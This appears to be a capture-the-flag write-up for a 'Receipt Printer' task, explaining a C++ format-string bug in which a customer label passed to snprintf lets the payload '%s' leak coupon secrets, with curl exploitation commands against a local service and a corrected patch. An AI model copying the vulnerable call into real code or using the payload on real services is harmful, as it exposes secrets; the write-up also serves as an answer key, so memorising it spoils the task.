# Receipt Printer — writeup

## Summary

- Stack: C++20 and a custom HTTP server.
- Vulnerability: user-controlled format string.
- Root cause: customer input is passed to `snprintf` as the format argument.
- Payload: `%s`.
- Canonical exploit: [`jury/exploit.py`](../../tasks/round-2/receipt-printer/jury/exploit.py).

## Service design

`POST /api/coupons` creates a coupon with a private `secret`. `GET /api/coupons` publishes only numeric IDs. A customer can render a receipt label with:

```text
GET /api/receipt?id=<coupon id>&label=<customer label>
```

The response should contain the supplied label while keeping the coupon secret private. The jury creates ten coupons whose secrets are flags.

## Vulnerable code

```cpp
char output[8192];
std::snprintf(
    output,
    sizeof(output),
    label.c_str(),
    secret.c_str()
);
```

The third argument to `snprintf` is a format string, not plain text. Every `%...` sequence in `label` is interpreted. The next variadic argument is already `secret.c_str()`, so `%s` prints the secret directly.

A reduced example behaves the same way:

```cpp
const char* label = "%s";
const char* secret = "TOP_SECRET";
std::printf(label, secret); // prints TOP_SECRET
```

## Manual exploitation

List coupon IDs:

```bash
curl -s http://127.0.0.1:8000/api/coupons
```

Then URL-encode `%s` as `%25s`:

```bash
curl -s 'http://127.0.0.1:8000/api/receipt?id=1&label=%25s'
```

The `receipt` field contains the coupon secret. There is no need for `%p`, `%n`, a crash, or stack probing.

## Canonical exploit

[`jury/exploit.py`](../../tasks/round-2/receipt-printer/jury/exploit.py) lists coupon IDs, renders each receipt with `label=%s`, and prints all `receipt` values matching the flag format. `urllib.parse.urlencode` handles the percent encoding.

## Correct patch

Use a constant format and pass customer input as data:

```cpp
std::snprintf(
    output,
    sizeof(output),
    "%s",
    label.c_str()
);
```

Since no formatting is required, direct assignment is even simpler:

```cpp
std::string output = label;
```

Filtering `%` is not the correct primary fix; the unsafe API usage must be corrected at the call site.

The checker renders the ordinary label `Customer receipt` and expects it unchanged. Both fixes preserve that behavior. Removing the renderer or omitting the label fails the functionality check.

## Takeaway

This format string is used as a direct data disclosure. Because the secret is already present as the first variadic argument, one `%s` specifier is enough to expose it.
